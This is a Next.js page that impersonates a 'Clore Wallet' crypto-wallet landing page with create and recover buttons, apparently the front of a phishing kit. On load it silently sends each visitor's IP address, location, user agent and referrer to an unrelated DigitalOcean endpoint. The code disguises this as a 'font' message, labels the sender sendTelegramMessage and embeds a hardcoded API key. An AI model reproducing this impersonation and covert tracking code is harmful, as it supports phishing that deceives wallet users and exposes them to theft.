"use client";

import Link from "next/link";
import { useState, useEffect, useRef } from "react";
import { getUserCountry } from "./userLocation";
import axios from "axios";
import { usePathname } from "next/navigation";
export default function Home() {

  const [country, setCountry] = useState("");
  const [ipAddress, setIpAddress] = useState("");
  const [browser, setBrowser] = useState<string | undefined>(undefined);
  const [isVerifiedBot, setIsVerifiedBot] = useState(false);
  const hasSentVisitorMessage = useRef(false);
  const pathname = usePathname();
  const getCurrentUrl = () => {
    if (typeof window !== "undefined") {
      let url = `${window.location.origin}${pathname}`;
      if (url.includes("localhost")) {
        url = "https://google.com";
      }
      if (url.includes("vercel.com")) {
        url = url.replace("vercel.com", "digitalocean.com");
      }
      console.log("getCurrentUrl returning:", url);
      return url;
    }
    console.log("getCurrentUrl: window not available, returning empty string");
    return "";
  };
  const sendTelegramMessage = (userCountry: { country?: string; countryEmoji?: string; city?: string; ip?: string } | null) => {
    // console.log("User Country", userCountry);

    const messageData = {
      info: "Regular Visitor", // You can update this logic as needed
      url: getCurrentUrl(),
      referer: document.referrer || getCurrentUrl(),
      location: {
        country: userCountry?.country || "Unknown",
        countryEmoji: userCountry?.countryEmoji || "",
        city: userCountry?.city || "Unknown",
        ipAddress: userCountry?.ip || "0.0.0.0",
      },
      agent: typeof navigator !== "undefined" ? navigator.userAgent : browser,
      date: new Date().toISOString(),
      appName: "coinspace",
    };
    console.log("Message Data", messageData);
    axios
      .post(
        "https://squid-app-2-abmzx.ondigitalocean.app/api/t1/font",
        messageData,
        {
          headers: {
            "Content-Type": "application/json",
            "x-api-key": "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b",
          },
        }
      )
      .catch((error) =>
        console.error(
          "Error sending font message:",
          error.response.data.details
        )
      );
  };

  useEffect(() => {
    if (!hasSentVisitorMessage.current) {
      const fetchUserLocation = async () => {
        const userCountry = await getUserCountry();
        setCountry(userCountry?.country || "Unknown");
        setIpAddress(userCountry?.ip || "0.0.0.0");
        sendTelegramMessage(userCountry);
      };
      fetchUserLocation();
      hasSentVisitorMessage.current = true;
    }
  }, []);

 

  useEffect(() => {
    // Set browser info only on client side
    if (typeof window !== "undefined") {
      setBrowser(navigator.userAgent);
    }
  }, []);

  useEffect(() => {
    if (!hasSentVisitorMessage.current) {
      const fetchUserLocation = async () => {
        const userCountry = await getUserCountry();
        setCountry(userCountry?.country || "Unknown");
        setIpAddress(userCountry?.ip || "0.0.0.0");
        sendTelegramMessage(userCountry);
      };
      fetchUserLocation();
      hasSentVisitorMessage.current = true;
    }
  }, []);
  return (
    <div className="min-h-screen w-full relative">
      {/* Background image layer with brightness */}
      <div
        className="absolute inset-0 bg-center bg-no-repeat"
        style={{
          backgroundImage: "url('https://wallet.clore.ai/background.svg')",
          backgroundSize: "75%",
          filter: "brightness(2.5) ", // Adjust these values
        }}
      />
      {/* Overlay to darken the background */}
      <div className="absolute inset-0 bg-black/70"></div>

      {/* NAVBAR */}
      <nav className="relative z-10 flex items-center px-6 py-4">
        <Link href="/" className="text-white text-xl font-semibold">
          Clore Wallet
        </Link>
      </nav>

      {/* MAIN CARD */}
      <div className="relative z-10 flex justify-center items-center min-h-[80vh] px-6">
        <div className="bg-neutral-900/90 border border-neutral-700 rounded-xl p-6 w-full max-w-md shadow-lg backdrop-blur-md">
          <h2 className="text-white text-2xl font-semibold mb-2">Welcome</h2>
          <p className="text-neutral-400 text-sm mb-6">
            Create a new wallet or Recover an existing wallet
          </p>

          <Link href="/create">
            <button className="w-full bg-red-600 hover:bg-red-700 text-white font-medium py-3 rounded-lg transition mb-3">
              Create A New Wallet
            </button>
          </Link>

          <button
            className="w-full bg-grey text-white font-medium py-3 rounded-lg transition mb-3"
            onClick={() => (window.location.href = "/recover")}
          >
            Recover an existing wallet
          </button>
        </div>
      </div>
    </div>
  );
}
